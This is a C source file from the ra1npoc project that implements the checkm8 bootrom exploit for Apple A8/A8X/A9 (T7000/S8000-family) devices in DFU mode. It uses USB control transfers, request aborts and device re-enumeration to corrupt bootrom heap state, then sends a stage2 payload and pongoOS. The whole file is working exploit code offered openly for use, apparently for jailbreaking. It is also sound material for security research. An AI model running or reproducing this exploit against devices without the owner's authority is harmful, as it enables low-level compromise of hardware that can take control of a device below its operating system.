/*
 * ra1npoc - t7000_s8000.c .. exploit for t7000/t7001/s8000/s8003
 *
 * Copyright (c) 2021 dora2ios
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

#include <io/iousb.h>
#include <common/common.h>

static unsigned char blank[DFU_MAX_TRANSFER_SZ];

static void set_global_state(io_client_t client)
{
    transfer_t result;
    unsigned int val;
    UInt32 sent;
    
    memset(&blank, '\x41', DFU_MAX_TRANSFER_SZ);
    
    val = 704; // A8/A8X/A9
    
    int i=0;
    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ, 0)) != 0x40){
        i++;
        DEBUGLOG("[%s] (*) retry: %x", __FUNCTION__, i);
        usleep(10000);
        result = send_data(client, blank, 64); // send blank data and redo the request.
        DEBUGLOG("[%s] (*) %x", __FUNCTION__, result.ret);
        usleep(10000);
    }
    
    DEBUGLOG("[%s] (1/3) val: %x", __FUNCTION__, val);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100);
    DEBUGLOG("[%s] (2/3) %x", __FUNCTION__, result.ret);
    
    result = send_abort(client);
    DEBUGLOG("[%s] (3/3) %x", __FUNCTION__, result.ret);
}

static void heap_occupation(io_client_t client, checkra1n_payload_t payload)
{
    transfer_t result;
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload.over2, payload.over2_len, 100);
    DEBUGLOG("[%s] (1/2) %x", __FUNCTION__, result.ret);
    result = send_abort(client);
    DEBUGLOG("[%s] (2/2) %x", __FUNCTION__, result.ret);
}

int checkm8_t7000_s8000(io_client_t client, checkra1n_payload_t payload)
{
    int ret = 0;
    
    transfer_t result;
    
    memset(&blank, '\0', DFU_MAX_TRANSFER_SZ);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, DFU_MAX_TRANSFER_SZ);
    usleep(1000);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG("[%s] running set_global_state()", __FUNCTION__);
    set_global_state(client);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_NO_RESET, false, 10000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG("[%s] running heap_occupation()", __FUNCTION__);
    heap_occupation(client, payload);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_NO_RESET, false, 10000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG("[%s] checkmate!", __FUNCTION__);
    
    if(payload.stage2_len != 0) {
        LOG("[%s] sending stage2 payload", __FUNCTION__);
        usleep(10000);
        ret = payload_stage2(client, payload);
        if(ret != 0){
            ERROR("[%s] ERROR: Failed to send stage2", __FUNCTION__);
            return -1;
        }
    }
    
    if(payload.pongoOS_len != 0) {
        usleep(10000);
        LOG("[%s] connecting to stage2", __FUNCTION__);
        ret = connect_to_stage2(client, payload);
        if(ret != 0){
            return -1; // err
        }
    }

    
    return 0;
}
